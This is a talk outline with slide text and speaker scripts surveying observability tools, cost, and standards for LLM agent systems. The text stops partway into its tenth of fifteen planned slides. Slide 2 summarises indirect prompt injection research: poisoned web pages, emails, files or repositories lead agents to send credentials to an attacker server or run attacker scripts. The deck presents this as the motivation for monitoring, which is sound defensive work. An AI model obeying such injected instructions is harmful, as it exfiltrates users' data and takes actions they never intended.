# Agent Observability 2025: Safety • Cost • Control

Academic Survey-First Structure (15 min)

---

## Flow (15 slides total, ≈15 min — reordered for narrative clarity)

**Part 1: The Problem & Its Timeliness (Slides 1-5)**
1. Title & Contributions (1 slide)
2. State & Motivation: Safety under uncertainty / IPI (1 slide)
3. State & Motivation: Cost & ROI / Token escalation (1 slide)
4. State & Motivation: Fragmentation & integration surface / MCP + managed components (1 slide)
5. Standards & ecosystem (Why now) (1 slide) ← **This is why the timing is right**

**Part 2: The Landscape & The Gaps (Slides 6-12)**
6. Background I: APM/Serving (what it gives & what it misses) (1 slide)
7. Background II: Model-centric tools (capabilities & limits) (1 slide)
8. Background III: Agent-level frameworks (what they do & gaps) (1 slide)
9. Industrial Landscape: Three Tiers + Adoption + SDK Limitations (1 slide)
10. Academic signals: Safety (IPI), Cost escalation & Balanced view (1 slide)
11. Formal: Two Gaps & Requirements (1 slide)
12. Formal Definition: Agent Observability (1 slide) ← **Formalization after gaps identified**

**Part 3: The Solution & Vision (Slides 13-15)**
13. Vision: Two-Plane Architecture (overview) (1 slide)
14. Vision: Data Plane (evidence & practice) (1 slide)
15. Vision: Cognitive Plane (algorithms & outputs) (1 slide)


## Slides

### 1) Title & Contributions (0:30)

#### Detail Content (Script)

Agent Observability 2025: Safety • Cost • Control

*Towards Agent-Oriented Observability*

Key Contributions:

1. Systematize the Landscape: Map three existing observability silos
   - APM/Serving (infrastructure-focused)
   - LLM-centric (model I/O-focused)
   - Agent-level (lifecycle-focused)

2. Formalize the Problem: Define two fundamental gaps
   - Instrumentation Gap: App-layer SDKs are brittle and tamperable
   - Semantic Gap: Boundary telemetry lacks intent and causality

3. Propose the Solution: Two-Plane Architecture
   - Data Plane: Boundary-based capture + OTel GenAI spans
   - Cognitive Plane: AI-powered semantic analysis + governance
   - Plus: Evaluation metrics, deployment roadmap, privacy framework

Speaker Script (0:30):
"Thanks for joining. Production agent systems are becoming black boxes. They are autonomous, non-deterministic, and opaque. Observability is no longer optional. It's a fundamental requirement for trust. Today I'll show you what breaks: safety, cost, and fragmentation. Then I'll survey current tools, isolate two critical gaps, and explain why emerging standards make these problems solvable now. I'll close with our Two-Plane architecture, the vision proposed in our paper."

#### Slide Deck (Visual)

**Agent Observability 2025**
**Safety • Cost • Control**

*Towards Agent-Oriented Observability*

Yangpen Hu, Yusheng Zheng
**Visual:** Flow diagram:
`[Three Silos] → [Two Gaps] → [Two-Plane Solution]`

---

### 2) Safety Under Uncertainty (0:50)

#### Detail Content (Script)

Challenge: Indirect Prompt Injection (IPI) systematically compromises tool-using agents

InjecAgent Benchmark (ACL Findings 2024):

Scale & Methodology:
- 1,054 test cases across diverse attack scenarios
- 17 user tools (legitimate agent capabilities)
- 62 attacker tools (malicious payloads)
- Evaluates 30 agent frameworks (GPT-4, Claude, open-source)

Attack Surface Taxonomy:
| Attack Vector | Injection Point | Example Scenario |
|--------------|----------------|------------------|
| Web Scraping | Malicious HTML/JS | Poisoned search results |
| Email Ingestion | Crafted email content | Phishing with agent instructions |
| File Processing | Document metadata/content | Malicious PDFs, DOCX |
| Repository Cloning | README, code comments | Supply chain attack via docs |

Concrete Attack Outcomes:
- Data Exfiltration: Agent sends user credentials to attacker server
- Unauthorized Actions: Agent executes commands without user intent
- Malicious Code Execution: Agent runs attacker-provided scripts

Key Findings:
- Vulnerabilities persist across implementations (not framework-specific)
- Quiet failures: Agent performs harmful action without error signals
- No 5xx errors—just plausible but wrong behavior

Observability Requirement:
→ Demands audit-quality trajectory traces with boundary-aligned capture

*Source: [ACL Anthology 2024.findings-acl.624](https://aclanthology.org/2024.findings-acl.624/)*

Visual:
- Left: Attack surface funnel (web/email/files/repos → agent)
- Right: Pipeline diagram: `Attacker Content → Tool Output → Agent Reasoning → Harmful Action`

Speaker Script (0:50):
"First, safety. In tool-using contexts, agents face indirect prompt injection, where malicious content embedded in web pages, emails, repositories, or files hijacks tool usage. The InjecAgent benchmark systematically evaluates this threat: 1,054 test cases across 17 user tools and 62 attacker tools, testing 30 agent frameworks. Vulnerabilities persist across all implementations, regardless of framework. Attack surfaces include web scraping, email ingestion, file processing, and repository cloning. The concrete outcomes are serious: data exfiltration, unauthorized actions, and malicious code execution. What makes this particularly challenging is that these are semantic failures. No 5xx errors or crashes occur, just plausible but incorrect behavior. Furthermore, agents are non-deterministic, meaning the same prompt can yield different reasoning paths with each execution. This demands audit-quality trajectory traces with boundary-aligned capture."

#### Slide Deck (Visual)

**The #1 Safety Threat: Indirect Prompt Injection**

Malicious content (files, websites) hijacks agent behavior → "quiet failures"

**Problem:** No error signal—agent just does the wrong thing

**Visual:** Simple diagram: `Malicious PDF → Agent → Sends data to attacker.com`

*Footer: InjecAgent, ACL Findings 2024*

---

### 3) Cost & ROI (0:55)

#### Detail Content (Script)

Challenge: Multi-agent orchestration boosts accuracy but escalates costs on two fronts

---

1. Token-Level Costs (Algorithm Layer)

Research Evidence:

| Study | Key Finding | Impact |
|-------|------------|--------|
| S²-MAD (NAACL-25) | Multi-agent debate drives token growth | Token efficiency needed as first-class objective |
| Economical Pipeline (ICLR-25) | Documents substantial token overhead | Intrinsic to multi-agent communication |
| Scaling Multi-Agent (ICLR-25) | Token growth ~7.5× in certain regimes | Non-linear scaling behavior |

Key Insight:
- Multi-agent coordination creates token explosion problem
- Need for $/task & tokens/solve as primary SLIs

---

2. Infrastructure-Level Costs (Platform Layer) — NEW EVIDENCE

TrEnv Study (arXiv:2509.09525):

Cost Breakdown:
- Serverless overhead for agent workloads: ≈70% of LLM API cost
- Previously underestimated: infra_k is non-trivial in the cost equation

Cost Challenge:
- Infrastructure costs can dominate the total spend
- Significant variability across deployment models (containers vs VMs)

---

Unified Cost Model:

```
Cost(task) ≈ Σ tokens_i · price_i + Σ API_j + Σ infra_k
              ↑ Algorithm         ↑ Model   ↑ Platform (can be 70% of API!)
```

Observability Requirements:
1. Budget policies ($/task caps, tokens/solve thresholds)
2. Loop-stop conditions (prevent runaway costs)
3. Cost-aware orchestration (route to cheaper agents when appropriate)
4. Cross-layer attribution (link agent decisions → token costs → infra spend)

*Sources:*
- [S²-MAD NAACL 2025](https://aclanthology.org/2025.naacl-long.475.pdf)
- [TrEnv arXiv:2509.09525](https://arxiv.org/abs/2509.09525)
- [Stop Overvaluing MAD arXiv:2502.08788](https://arxiv.org/pdf/2502.08788)

Visual:
- Left: Bar chart showing token growth vs #agents/#rounds
- Center: Pie chart of cost breakdown (70% infra, 30% LLM API)
- Right: Before/After platform optimization (P99 latency, memory)

Speaker Script (0:55):
"Second, cost. Multi-agent orchestration increases accuracy but escalates costs on two fronts. At the algorithm layer, research demonstrates that multi-agent debate drives significant token growth. S²-MAD at NAACL-25 identifies this as a critical problem, arguing that token efficiency must become a first-class design objective. The Economical Pipeline work at ICLR documents substantial token overhead intrinsic to multi-agent communication, while another ICLR study shows token growth reaching approximately 7.5 times in certain scaling regimes. However, recent systems research reveals that infrastructure costs matter even more. TrEnv demonstrates that serverless overhead can represent approximately 70% of LLM API costs for agent workloads. Infrastructure costs can potentially dominate total spend and exhibit significant variability across deployment models. The implication is clear: cost governance requires observability across both token consumption and infrastructure layers."

#### Slide Deck (Visual)

**Cost & ROI: Two Escalation Fronts**

**Token-Level Costs:**
• Multi-agent debate → ~7.5× token growth (NAACL 2025)

**Infrastructure-Level Costs:**
• Serverless overhead ≈70% of LLM API cost (TrEnv)

**Unified Cost Model:**
Cost(task) = Tokens + API + Infrastructure

**Observability Needs:** Budget caps, loop-stop, cost attribution

**Visual:** Bar chart (token growth), Pie chart (70% infra / 30% API)

*Footer: ¹NAACL 2025, ²arXiv:2509.09525*

---

### 4) Fragmentation & Integration Surface (0:50)

#### Detail Content (Script)

Challenge: Multi-vendor stacks create complex ownership and integration boundaries

---

1. Stack Ownership & Responsibility Matrix

| Layer | Owner | Examples | Access Model |
|-------|-------|----------|--------------|
| Model Serving | SaaS Providers | OpenAI, Anthropic, Cohere | API-only (black box) |
| Agent Logic | App Teams | LangChain, AutoGPT, custom | White box (controlled) |
| Infrastructure | Ops Teams | K8s, containers, serverless | Shared responsibility |
| Tools | MCP Ecosystem | IDE, web, file system | Mixed (open + closed) |

Key Problem:
→ No single team owns the end-to-end observability stack

---

2. MCP Ecosystem Expansion (2025) — "Connect Once, Integrate Anywhere"

Major Adoption Announcements:

Microsoft Build 2025:
- Windows 11 adds first-party MCP support
- Copilot Studio integrates MCP for enterprise agents
- Vision: "Open Agentic Web" with standardized tool protocols

Google:
- Releases Data Commons MCP Server
- Brings public datasets to MCP-compatible agents

Implication:
- ✅ Great for capability: Rapid tool ecosystem growth
- ⚠️ Hard for observability: More surfaces to monitor, govern, and secure

*Source: [Microsoft Build 2025 Blog](https://blogs.microsoft.com/blog/2025/05/19/microsoft-build-2025-the-age-of-ai-agents-and-building-the-open-agentic-web/)*

---

3. Managed/Closed-Source Developer Agents

Examples:
| Agent | Surface | Observability Challenge |
|-------|---------|------------------------|
| Claude Code | VS Code, JetBrains, terminal | Binary-only, no SDK injection |
| GitHub Copilot | IDE-embedded | Proprietary runtime |
| Cursor | Forked VS Code | Closed modifications |
| Windows Copilot | OS-level | First-party, managed |

Key Constraint:
→ In-process SDK injection impractical for closed/managed components

Pragmatic Path:
→ Boundary-based capture (TLS, syscalls, API responses) + standardized spans (OTel GenAI)

*Source: [Anthropic Claude Code](https://anthropic.com/news/enabling-claude-code-to-work-more-autonomously)*

---

Observability Implications:

1. Cannot assume white-box instrumentation across all layers
2. Must capture at stable system boundaries (network, OS, model API)
3. Require standard telemetry formats (OTel GenAI spans) for correlation
4. Need policy enforcement outside agent process (Cognitive Plane)

Visual: Swimlane diagram showing:
```
┌─────────────────┬─────────────────┬─────────────────┬─────────────────┐
│ SaaS Model      │ App Agent       │ Ops System      │ MCP Tools       │
│ (API only)      │ (SDK possible)  │ (eBPF/metrics)  │ (mixed access)  │
├─────────────────┼─────────────────┼─────────────────┼─────────────────┤
│ OpenAI          │ LangChain code  │ K8s metrics     │ Claude Code IDE │
│ Anthropic       │ Custom logic    │ Prometheus      │ Windows Copilot │
│ Cohere          │ AutoGPT         │ Tetragon eBPF   │ Data Commons    │
└─────────────────┴─────────────────┴─────────────────┴─────────────────┘
     ↑                    ↑                ↑                  ↑
  Boundary          Instrumented      Boundary          Boundary
  Capture              Spans          Capture           Capture
```

Speaker Script (0:50):
"Third, fragmentation. Production stacks involve multiple layers with distributed ownership. Models are typically SaaS-managed. Agents live in application code. Systems are handled by operations teams, and tools connect via the Model Context Protocol. This ecosystem is expanding rapidly. Windows 11 and Copilot Studio adopted MCP with first-party support announced at Build 2025. Google released the Data Commons MCP Server, and Claude Code brings agentic coding capabilities to IDEs and terminals. However, these are often managed, closed-source surfaces where SDK injection is not feasible. This multi-vendor, multi-layer architecture makes cross-surface observability and policy enforcement particularly challenging."

#### Slide Deck (Visual)

**Fragmentation: Multi-Vendor Stacks**

**The Problem:** No single team owns end-to-end observability

**Four Layers:**
• SaaS Models (OpenAI, Anthropic) — API-only
• Agent Logic (LangChain, custom) — White box
• Infrastructure (K8s, containers) — Ops
• Tools (MCP: Claude Code, Copilot) — Mixed

**Challenge:** SDK injection impractical for closed components

**Solution:** Boundary capture (TLS, syscalls, API) + OTel GenAI

**Visual:** 4-layer swimlane with boundary capture points

*Footer: ¹Microsoft Build 2025, ²Anthropic*

---

### 5) Standards & Ecosystem (Why Now) (0:45)

#### Detail Content (Script)

OpenTelemetry GenAI: Stable conventions & ecosystem momentum
- Stable semantic conventions: model spans, agent spans, events, metrics
- OTel Blog (Mar 6, 2025): "AI Agent Observability - Evolving Standards and Best Practices"
- Tracks agent observability standardization across industry
- Shared schema to exchange agent telemetry across vendors/backends
- *Source: [OTel GenAI Agent Spans](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-agent-spans/), [OTel Blog 2025](https://opentelemetry.io/blog/2025/ai-agent-observability/)*

OpenInference & OpenLLMetry: Reduce SDK sprawl
- OTel-compatible tracers/conventions for LLM frameworks
- Bridge Python/JS/Java ecosystems and backends (Langfuse, Phoenix, Datadog)
- Good dev ergonomics, but app-side only (not sufficient for production trust alone)
- *Source: [Arize OpenInference](https://arize.com/docs/ax/observe/tracing/tracing-concepts/what-is-openinference), [OpenInference GitHub](https://github.com/Arize-ai/openinference)*

MCP (Model Context Protocol): "USB-C for AI tools" — Rising platform support
- Standardizes agent ↔ tool/data connections (Anthropic spec)
- Microsoft Build 2025: Windows first-party MCP support announced
- Reuters (May 19, 2025): "Microsoft wants AI agents to work together, remember things"
- The Verge: Windows AI Foundry MCP support; Anthropic MCP data sources coverage
- Google & partners release MCP servers (Data Commons, etc.)
- Implication: More integrations → higher observability & policy demand across tools/agents
- *Sources:*
  - [MCP Specification](https://modelcontextprotocol.io/specification/latest)
  - [Microsoft Build 2025 Blog](https://blogs.microsoft.com/blog/2025/05/19/microsoft-build-2025-the-age-of-ai-agents-and-building-the-open-agentic-web/)
  - [Reuters: Microsoft AI agents](https://www.reuters.com/business/microsoft-wants-ai-agents-work-together-remember-things-2025-05-19/)
  - [The Verge: Windows MCP](https://www.theverge.com/news/669298/microsoft-windows-ai-foundry-mcp-support)
  - [The Verge: Anthropic MCP](https://www.theverge.com/2024/11/25/24305774/anthropic-model-context-protocol-data-sources)

Managed / closed-source components:
- Parts of the stack (e.g., Claude Code CLI/IDE, Copilot, Cursor) are not open to in-process SDK injection
- Boundary-based capture + standard spans (OTel GenAI) become pragmatic path
- *Source: [Claude Code Autonomous Work](https://anthropic.com/news/enabling-claude-code-to-work-more-autonomously)*

Speaker Script (0:45):
"This convergence of standards explains why the timing is right to address these challenges. OpenTelemetry GenAI provides stable semantic conventions for agent and model spans, events, and metrics. The OTel blog published 'AI Agent Observability: Evolving Standards and Best Practices' on March 6, 2025, tracking agent observability standardization across the industry. OpenInference and OpenLLMetry provide OTel-compatible tracers and conventions, bridging Python, JavaScript, and Java ecosystems to backends like Langfuse, Phoenix, and Datadog. The Model Context Protocol, often described as 'USB-C for AI tools', is gaining significant production adoption. Microsoft Build 2025 announced Windows first-party MCP support, with Reuters reporting 'Microsoft wants AI agents to work together, remember things.' The Verge covered both Windows AI Foundry MCP support and Anthropic's MCP data sources, while Google released the Data Commons MCP server. This ecosystem expansion raises the bar for observability and policy. More integrations create higher demand for cross-tool correlation and governance. However, parts of the stack like Claude Code CLI, IDE integrations, Copilot, and Cursor are not open to in-process SDK injection. This makes boundary-based capture combined with OTel GenAI the pragmatic path forward."

#### Slide Deck (Visual)

**Standards & Ecosystem (Why Now)**

**Three Converging Standards:**

1. **OTel GenAI:** Stable agent + model spans (Mar 2025)
2. **OpenInference/OpenLLMetry:** OTel-compatible tracers
3. **MCP:** Tool protocol with platform support (Microsoft, Google)

**Why This Matters:** Standards enable boundary-based observability for closed systems

*Footer: ¹OTel Blog 2025, ²Microsoft Build 2025*

---

### 6) Background I: APM/Serving (What It Gives & What It Misses) (0:50)

#### Detail Content (Script)

**What Serving/APM Already Gives You:**

Infrastructure SLOs: throughput, latency, GPU/memory, error rates

vLLM:
- Prometheus metrics for server/request levels
- Metrics: tokens/s, queue depth, time to first token (TTFT), time per output token (TPOT)
- Community dashboards available (Grafana templates)
- *Source: [vLLM Metrics](https://docs.vllm.ai/en/latest/design/metrics.html)*

NVIDIA Triton:
- Prometheus endpoint with GPU/request stats
- Performance analyzer tools for profiling
- Model-level latency/throughput metrics
- *Source: [NVIDIA Triton Metrics](https://docs.nvidia.com/deeplearning/triton-inference-server/user-guide/docs/user_guide/metrics.html)*

Cloud production recipes:
- GKE/GCP: vLLM + Managed Prometheus + Triton integration guides
- IBM/CoreWeave: Production monitoring practices & dashboards
- *Source: [Google Cloud vLLM](https://cloud.google.com/stackdriver/docs/managed-prometheus/exporters/vllm), [IBM Medium](https://medium.com/ibm-data-ai/building-production-ready-observability-for-vllm-a2f4924d3949)*

---

**What Serving/APM Misses for Agents:**

These SLOs do NOT answer:

- Intent/trajectory correctness: Did the agent reason correctly?
- Tool justification: Why was this tool chosen over alternatives?
- Goal attainment: Did the agent achieve the user's objective?
- Cross-layer cost attribution: Which agent decision caused which system/model cost?
- Behavioral assurance under policy: Did the agent respect safety boundaries & budget constraints?

Serving ≠ behavioral assurance

Your paper's Table 1 distinction:
- Request trace (APM): HTTP span → inference call → response (infrastructure view)
- Decision trajectory (Agent): goal → reasoning → tool selection → action → outcome (behavioral view)

Visual: Split slide — Left: PromQL/Grafana panels (throughput, latency, GPU); Right: Table 1 comparison (request trace vs decision trajectory)

Speaker Script (0:50):
"APM and Serving tools excel at infrastructure SLOs. vLLM exposes Prometheus metrics with community Grafana dashboards tracking tokens per second, queue depth, and time to first token. NVIDIA Triton provides GPU and request statistics along with Performance Analyzer tools for profiling. Cloud providers like GCP and IBM have published production monitoring practices. These provide necessary foundations for LLM serving health. However, these SLOs do not answer critical questions about agent behavior: Did the agent reason correctly? Why was this tool chosen over alternatives? Did the agent achieve the user's objective? Which agent decision caused which system or model cost? Did the agent respect safety boundaries and budget constraints? The key insight is that serving does not equal behavioral assurance. Traditional observability focuses on request traces, from HTTP span to inference call to response. Agent observability requires decision trajectories, from goal to reasoning to tool selection to action to outcome. This represents a shift from system monitoring to behavioral debugging."

#### Slide Deck (Visual)

**Background I: APM/Serving**

**What It Gives:**
• Infrastructure SLOs: throughput, latency, GPU, tokens/s (vLLM, Triton)

**What It Misses for Agents:**
• Intent, tool justification, goal attainment
• Cross-layer cost attribution
• Behavioral assurance

**Key Distinction:** Request trace (infra) ≠ Decision trajectory (behavior)

**Visual:** Split diagram (Grafana metrics vs decision trajectory)

*Footer: ¹vLLM, ²Triton*

---

### 7) Background II: Model-Centric Tools (Capabilities & Limits) (0:50)

#### Detail Content (Script)

**Capabilities & Ecosystem:**

OpenTelemetry GenAI: The key schema for portability

- Semantic conventions (stable):
  - Model spans: capture inference operations (tokens, latency, provider)
  - Agent spans: capture agent workflow steps (planning, tool use, reflection)
  - Events: discrete observations within spans (tool calls, retrievals)
  - Metrics: aggregatable measurements (cost, token counts)
- Shared schema enables cross-vendor/backend telemetry exchange
- *Source: [OTel GenAI Semconv](https://opentelemetry.io/docs/specs/semconv/gen-ai/)*

OTel-compatible ecosystem:

- OpenInference: OTel-compatible tracing conventions for LLMs (Arize Phoenix)
- OpenLLMetry: OTel instrumentations for LangChain, LlamaIndex, etc. (Traceloop)
- Langfuse as OTel backend: Accepts OTLP, provides UI for traces/evals/costs
- Bridge Python/JS/Java ecosystems and backends
- *Source: [Arize OpenInference](https://github.com/Arize-ai/openinference), [Langfuse OTLP](https://langfuse.com/docs/integrations/opentelemetry)*

Commercial backends with LLM Observability:
- LangSmith: Traces/evals (1 env var to enable)
- Honeycomb & Datadog: LLM Observability features (chain tracing, cost tracking)

---

**Limits: Often stop at model boundary**

Coverage gaps:
- Strong on model I/O (prompts, completions, tokens, latency)
- Weak on system layer (process, file, subprocess)
- Weak on network layer (TLS plaintext, cross-service calls beyond HTTP)
- Weak on tool execution layer (what actually happened on the OS/filesystem)

Integration requirements:
- SDK/proxy still required at application layer
- Each tool needs application-side hooks (decorators, middleware, env vars)
- Fragmentation: each framework (LangChain, LlamaIndex, AutoGPT) needs separate instrumentation

Cross-layer correlation challenges:
- Weak causality between agent decision → model call → system action → cost
- Multi-agent coordination often not modeled (spans per agent, but orchestration unclear)

Example from docs:
- LangSmith shows traces, evals, costs — but not system/IPC/TLS capture
- *Source: [LangSmith Observability](https://docs.langchain.com/langsmith/observability)*

Visual: Split slide — Left: "Spec-stack" diagram (GenAI semconv → OpenInference/OpenLLMetry → backends); Right: "Coverage heatmap" (strong: model I/O, medium: app logic, weak: system/network/tool execution)

Speaker Script (0:50):
"The model-centric ecosystem is maturing rapidly. OpenTelemetry GenAI now defines agent spans, model spans, events, and metrics as stable semantic conventions. OpenInference and OpenLLMetry provide OTel-compatible tracing conventions for LLM frameworks, effectively bridging Python, JavaScript, and Java ecosystems. Tools like Langfuse act as OTLP backends, accepting traces directly with features for session replay and cost tracking. LangSmith from LangChain provides one-environment-variable tracing with integrated evaluation suites. Arize Phoenix offers real-time trace visualization and LLM-as-judge evaluations. Commercial platforms like Honeycomb and Datadog have launched LLM Observability features. However, these tools excel for prompts and evaluations but often stop at the model boundary and require application-side SDKs. Coverage gaps emerge. They are strong on model I/O but weak on system layer events, network layer beyond HTTP, and tool execution outcomes. Cross-layer correlation between agent decision, model call, system action, and cost remains partial. Multi-agent coordination is often not modeled at all."

#### Slide Deck (Visual)

**Background II: Model-Centric Tools**

**Capabilities:**
• OTel GenAI: Stable agent/model spans
• OpenInference, OpenLLMetry: OTel-compatible tracers
• Tools: Langfuse (session replay), LangSmith (eval suites), Phoenix (LLM-as-judge), Datadog/Honeycomb

**Limits:**
• Strong: Model I/O (prompts, tokens, latency)
• Weak: System layer (process, files), network (TLS), tool execution

**Challenge:** App-side SDKs required, weak cross-layer correlation

**Visual:** Coverage heatmap (strong/weak layers)

*Footer: ¹OTel GenAI, ²Langfuse, LangSmith, Phoenix*

---

### 8) Background III: Agent-Level Frameworks (What They Do & Gaps) (0:50)

#### Detail Content (Script)

**What They Do:**

AgentOps: Taxonomy & lifecycle tracing
- Defines artifacts: goals, plans, tools, sessions, observations, actions
- Focus: agent lifecycle tracing (session replay, event streams)
- Provides SDK for capturing agent workflow
- *Source: [arXiv:2411.05285](https://arxiv.org/abs/2411.05285)*

Maxim AI:
- Agent trajectory visualization & distributed tracing
- Multi-agent system debugging
- Evaluation framework integrated
- *Source: [Maxim AI Agent Tracing](https://www.getmaxim.ai/articles/agent-tracing-for-debugging-multi-agent-ai-systems/)*

PromptLayer:
- OTel-compatible traces
- Prompt versioning & A/B testing
- Cost tracking per prompt variant
- *Source: [PromptLayer Docs](https://promptlayer.com/)*

WhyLabs LangKit:
- Text metrics: quality, PII, toxicity, sentiment
- Drift detection for LLM outputs
- *Source: [PostHog LLM Observability Tools](https://posthog.com/blog/best-open-source-llm-observability-tools)*

---

**What's Still Missing:**

Single-agent focus dominates

Research gap:
- Many works focus on single agent's internal coherence
  - "Did this agent reason correctly given its prompt/tools?"
  - "Can we reconstruct the agent's reasoning trace?"
- Under-served: production concerns for multi-agent systems

Production needs under-emphasized:

1. Cost accountability:
   - Which agent/decision caused which token/$/system cost?
   - How to enforce budget policies across agents?

2. Multi-agent coordination:
   - How do multiple agents interact? (orchestration patterns, handoffs, conflicts)
   - Cross-agent causality & resource attribution

3. System-level observability:
   - How to correlate agent intents with system actions (file I/O, network, subprocess)?
   - How to capture tool execution outcomes vs. agent's expectations?

Your paper addresses this gap:
- Formalizes instrumentation gap (system capture) + semantic gap (intent ↔ action)
- Proposes system-level, multi-agent, cost-aware observability via Two-Plane Architecture

Visual: Split slide — Left: Matrix (rows = tools; cols = integration path, strengths, limits, OTel compat?); Right: "Single-agent focus" circle vs "Production multi-agent, multi-layer" larger circle showing gap

Speaker Script (0:50):
"Agent-level frameworks define what artifacts to capture throughout the agent lifecycle. AgentOps proposes a comprehensive taxonomy covering goals, plans, tools, sessions, observations, and actions, with a focus on lifecycle tracing and session replay. Maxim AI offers agent trajectory visualization and distributed tracing with evaluation frameworks integrated. PromptLayer provides OTel-compatible traces with prompt versioning and A/B testing, tracking cost per prompt variant. WhyLabs LangKit adds text quality metrics including PII detection, toxicity, sentiment, and drift detection for LLM outputs. However, there is a significant research gap. Many works focus on single-agent internal coherence, asking questions like 'Did this agent reason correctly given its prompt and tools?' or 'Can we reconstruct the agent's reasoning trace?' Under-served are production concerns for multi-agent systems. First, cost accountability: Which agent or decision caused which token, dollar, or system cost, and how do we enforce budget policies across agents? Second, multi-agent coordination: How do multiple agents interact through orchestration patterns, handoffs, and conflicts, and what about cross-agent causality and resource attribution? Third, system-level observability: How do we correlate agent intents with system actions like file I/O, network calls, and subprocess spawning, and how do we capture tool execution outcomes versus the agent's expectations? Our paper addresses this gap by formalizing the instrumentation and semantic gaps, and proposing system-level, multi-agent, cost-aware observability."

#### Slide Deck (Visual)

**Background III: Agent-Level Frameworks**

**What They Do:**
• AgentOps: Lifecycle taxonomy (goals, plans, tools, sessions), session replay
• Maxim AI: Trajectory visualization, distributed tracing, evaluation
• PromptLayer: OTel-compatible traces, prompt versioning, cost per variant
• WhyLabs LangKit: Text metrics (PII, toxicity, sentiment), drift detection

**What's Missing:**
• Single-agent focus dominates, under-serves production multi-agent needs
• Cost accountability: Which agent/decision caused costs?
• Multi-agent coordination: Orchestration patterns, causality, resource attribution
• System-level observability: Agent intents vs system actions

**Our Contribution:** Formalize instrumentation + semantic gaps; propose Two-Plane Architecture

**Visual:** Tools matrix vs single-agent focus circle vs production multi-agent gap

*Footer: ¹AgentOps arXiv, ²Maxim AI, ³PromptLayer*

---

### 9) Industrial Landscape: Three Tiers + Adoption + SDK Limitations (1:30)

#### Detail Content (Script)

**Part A: Three-Tier Landscape**

| Layer | Tools | Integration | OTel? | Strengths | Limits |
|-------|-------|------------|-------|-----------|--------|
| APM/Serving | vLLM, Triton | Prometheus endpoints | Metrics | Infra SLO (GPU, latency, throughput) | No semantics/intent |
| LLM-centric | LangSmith, Langfuse, Phoenix, OpenLLMetry, Honeycomb, Datadog | App SDK/env var | ✓ | Fast adoption, model I/O visibility | App-side hooks, weak system layer |
| Agent-level | Maxim AI, PromptLayer, LangKit | Framework SDK | Partial | Agent trajectory focus | In-app hooks, limited system boundary |

Sources:
- APM/Serving: [vLLM](https://docs.vllm.ai/en/latest/usage/metrics.html), [Triton](https://docs.nvidia.com/deeplearning/triton-inference-server/user-guide/docs/user_guide/metrics.html)
- LLM-centric: [LangSmith](https://docs.langchain.com/langsmith/observability), [Langfuse OTLP](https://langfuse.com/docs/integrations/opentelemetry), [OpenInference](https://arize.com/docs/ax/observe/tracing/tracing-concepts/what-is-openinference)
- Agent-level: [Maxim AI](https://www.getmaxim.ai/articles/agent-tracing-for-debugging-multi-agent-ai-systems/), [PostHog](https://posthog.com/blog/best-open-source-llm-observability-tools)

---

**Part B: Industry Reference Architectures (2024-2025)**

KubeCon / Cloud Native Summit:
- GenAI Framework Observability (Adrian Cole, 2024)
- Covers OTel GenAI semantic conventions + MCP updates
- Shows agent span patterns in practice
- *Source: [Speaker Deck](https://speakerdeck.com/adriancole/genai-framework-observability-at-cloud-native-s)*

OpenTelemetry AI Agent Observability blog:
- Evolving standards & best practices
- Multi-vendor telemetry exchange via OTel
- *Source: [OTel Blog 2025](https://opentelemetry.io/blog/2025/ai-agent-observability/)*

Production monitoring patterns:
- IBM + vLLM: Prometheus + Grafana dashboards
- GCP Managed Prometheus: vLLM exporter integration
- Combining OTel + Prom: Model spans (OTel) + infra metrics (Prom) correlated by trace ID
- *Source: [IBM Medium](https://medium.com/ibm-data-ai/building-production-ready-observability-for-vllm-a2f4924d3949), [Google Cloud](https://cloud.google.com/stackdriver/docs/managed-prometheus/exporters/vllm)*

Vendor conferences:
- Arize Observe 2025: OpenInference updates, production case studies
- LangChain Interrupt 2025: Agent reliability & observability patterns

---

**Part C: Why SDK-Only Is Insufficient**

Managed/closed-source components make SDK injection impractical

Examples where you CANNOT inject SDKs:

1. Developer agents (IDE/terminal):
   - Claude Code (VS Code, JetBrains, terminal)
   - GitHub Copilot (embedded in IDE)
   - Cursor (forked VS Code)
   - Closed-source binaries, proprietary integrations

2. OS/platform integrations:
   - Windows Copilot / Copilot Studio (OS-level agent)
   - First-party MCP servers (Microsoft, Google)

3. SaaS model providers:
   - OpenAI, Anthropic, Google APIs
   - No access to internal serving stack

Implication:
- Boundary-based capture (network, TLS, syscalls) + standardized spans (OTel GenAI) are the pragmatic path
- Can correlate external observations (TLS plaintext, process events, model API responses) without modifying proprietary code

Sources:
- [Anthropic Claude Code](https://anthropic.com/news/enabling-claude-code-to-work-more-autonomously)
- [Microsoft Build 2025](https://blogs.microsoft.com/blog/2025/05/19/microsoft-build-2025-the-age-of-ai-agents-and-building-the-open-agentic-web/)

---

Visual:
- Top: 3-column landscape matrix with OTel checkmarks
- Middle: Reference architecture diagram (OTel spans → backends; Prom metrics → Grafana)
- Bottom: Split diagram showing "Where SDKs cannot go" (IDE/OS/SaaS closed) vs "Where boundaries are observable" (TLS/syscall/API layers)

Speaker Script (1:00):
"The industrial landscape can be understood as three tiers. At the bottom, APM and Serving tools like vLLM and Triton provide infrastructure health monitoring. In the middle, LLM-centric tools like LangSmith, Langfuse, and Phoenix focus on model inputs and outputs and are rapidly adopting OpenTelemetry. At the top, Agent-level tools like Maxim AI focus on agent behavior and trajectory visualization.

However, two production constraints are forcing a fundamental shift in how we approach agent observability. First, SDKs are insufficient. You simply cannot inject an SDK into managed components like Claude Code, Windows Copilot, or proprietary SaaS APIs. Second, standards are essential. The industry is converging on OpenTelemetry to connect these different and often closed systems. This makes boundary-based capture not a choice, but a necessity for production deployments."

#### Slide Deck (Visual)

**Industrial Landscape: Three Tiers & Production Constraints**

**The Three Tiers of Agent Observability**

| Layer           | Representative Tools        | Core Strength                     |
|-----------------|-----------------------------|-----------------------------------|
| **APM/Serving** | vLLM, Triton                | Infrastructure SLOs (GPU, latency)|
| **LLM-centric** | LangSmith, Langfuse, Phoenix| Model I/O, OTel Adoption          |
| **Agent-level** | Maxim AI, PromptLayer       | Agent Trajectory & Behavior       |

**Two Key Production Constraints**

1. **SDKs Are Insufficient:** Cannot inject into managed components (Claude Code, Windows Copilot) or SaaS APIs
2. **Standards Are Essential:** Industry converging on OpenTelemetry for interoperability

**Visual:** Clean 3-row table + two icons (Closed Components & OTel Standard)

*Footer: ¹vLLM, ²OTel Blog 2025, ³Microsoft Build 2025*

---

### 10) Academic Signals: Emerging Research on Agent Observability (1:15)

#### Detail Content (Script)

**Recent Academic Work (2024-2025)**

Academic literature is beginning to address LLM agent observability systematically. Key contributions:
